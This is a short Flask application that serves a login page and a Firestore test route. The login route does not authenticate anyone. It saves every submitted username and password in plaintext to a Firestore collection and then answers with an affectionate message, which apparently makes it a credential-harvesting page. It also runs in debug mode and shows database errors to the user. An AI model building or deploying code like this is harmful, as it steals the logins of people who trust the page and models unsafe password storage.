from flask import Flask, render_template, request
import firebase_admin
from firebase_admin import credentials, firestore
import os
import json

app = Flask(__name__)

# --- Firebase Initialization ---
try:
    firebase_json = os.environ.get("FIREBASE_CREDENTIALS")
    cred_dict = json.loads(firebase_json)
    cred = credentials.Certificate(cred_dict)
    firebase_admin.initialize_app(cred)
    db = firestore.client()
    print("✅ Firebase initialized successfully!")
except Exception as e:
    print("❌ Firebase initialization failed:", e)
    db = None

# --- Routes ---
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()

        if not username or not password:
            return "❌ Missing username or password."

        try:
            db.collection('users').document(username).set({
                'username': username,
                'password': password
            })
            return "I Love You,with all my heart!"
        except Exception as e:
            return f"❌ Failed to save login details: {e}"

    return render_template('login.html')

@app.route('/test-firebase')
def test_firebase():
    try:
        db.collection('test').add({'status': 'connected'})
        return "✅ Firestore test write successful!"
    except Exception as e:
        return f"❌ Firestore test failed: {e}"

if __name__ == '__main__':
    app.run(debug=True)
